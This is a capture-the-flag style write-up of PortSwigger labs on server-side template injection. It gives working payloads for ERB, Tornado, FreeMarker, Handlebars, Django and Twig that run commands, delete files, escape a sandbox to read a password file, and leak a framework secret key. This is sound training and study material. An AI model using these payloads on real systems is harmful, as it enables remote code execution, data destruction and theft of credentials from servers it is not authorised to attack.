```
Lab: Basic server-side template injection

PRACTITIONER

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby

```bash
./tplmap.py -u 'https://0a20004404c811b08028c78c00cd0012.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock' --os-cmd 'rm morale.txt'
```

---


```
Lab: Basic server-side template injection (code context)

PRACTITIONER

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter 
```

- blog-post-author-display=user.first_name}}{{7*7
- Comment a blog post and see Peter49
- Search for Tornado SSTI 

Payload : 
> blog-post-author-display=user.first_name}}{{os.system('rm%20morale.txt')

'os' is not defined

So, add : {% import os %}

Final payload : 

> blog-post-author-display=user.first_name}}%7B%25%20import%20os%20%25%7D{{os.system('rm%20morale.txt')

---
```
Lab: Server-side template injection using documentation

PRACTITIONER
LAB Not solved

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r
```
1. Detect : Edit template fonctionnality
2. Identify : 

Payload :
${product.getClass()}
> class lab.actions.templateengines.
FreeMarkerProduct
3. Exploit :

Read : https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#freemarker-java

Payload :
${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
uid=12002(carlos) gid=12002(carlos) groups=12002(carlos) 

Final payload : 
${"freemarker.template.utility.Execute"?new()("rm morale.txt")}

GG ! :)

---
```
Lab: Server-side template injection in an unknown language with a documented exploit

PRACTITIONER

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 
```


> message=Unfortunately%20this%20product%20is%20out%20of%20stock%7b%7b7%2a7%7d%7d

We get an error message. 
Ask chatGPT what technologie is used here : 

> Based on the error message provided, it seems that the technology of templating being used in this context is Handlebars. 

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs

Final payload url encoded : 
```
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27rm%20morale.txt%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```

---

```
Lab: Server-side template injection with information disclosure via user-supplied objects

PRACTITIONER

This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

To solve the lab, steal and submit the framework's secret key.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r
```

Payload : {{product.getClass()}}

Get an error message, so asking chatGPT what technologie is used here/ 

> Based on the traceback provided, it appears that the technology of templating used here is Django's template language

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#leaking-apps-secret-key

{{ messages.storages.0.signer.key }}

Don't work so lets check Debug info

{% debug %}

Final payload :
{{ settings.SECRET_KEY }}



---

```
Lab: Server-side template injection in a sandboxed environment

EXPERT

This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my_password.txt from Carlos's home directory. Then submit the contents of the file.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r
```

Payload : ${product.getClass()}

class lab.actions.templateengines.FreeMarkerProduct

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#freemarker-java

Final payload from hacktricks :
```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

> 99 109 112 121 97 116 121 112 106 115 51 97 118 97 49 107 53 57 121 98


Cyber chef recipe :

/CyberChef/#recipe=From_Decimal('Space',false)

> Mdp : cmpyatypjs3ava1k59yb

GG :)

---
```
Lab: Server-side template injection with a custom exploit

EXPERT

This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file /.ssh/id_rsa from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter
Warning

As with many high-severity vulnerabilities, experimenting with server-side template injection can be dangerous. If you're not careful when invoking methods, it is possible to damage your instance of the lab, which could make it unsolvable. If this happens, you will need to wait 20 minutes until your lab session resets.

```

1. Comment a post
2. Use polyglot payload for detecting the templating agent : `${{<%[%'"}}%\.`
3. Reload the commented post
4. See that the templating agent is Twig 
5. Exploit ! BOOM

When I tried to upload a webshell (because why not) got this stack trace :
```
<pre>PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: application/php in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/dice.png', 'application/php')
#1 {main}
  thrown in /home/carlos/User.php on line 28
</pre>
```

So you can use user.setAvatar method with the SSTI

Crafted payload : 
}}{{user.setAvatar('/home/carlos/.ssh/id_rsa', 'image/png')

Get the content inside id_rsa : 
> Nothing to see here :)

... Mhmmmm

Let's check whats inside user.php

Crafted payload : 
%7D%7D%7B%7Buser.setAvatar('/home/carlos/User.php',%20'image/png')

```
 public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }
```
I forget that we need to delete the id_rsa file

So use this : 

%7D%7D%7B%7Buser.setAvatar('home/carlos/.ssh/id_rsa',%20'image/png')%7B%7Buser.gdprDelete()%7D%7D

Okay, this delete the previous User.php file .... let wait 20 min until the lab reset xD

> %7D%7D%7B%7Buser.setAvatar('/home/carlos/.ssh/id_rsa',%20'image/png')

then :

> %7D%7D%7B%7Buser.gdprDelete()

GG !

---
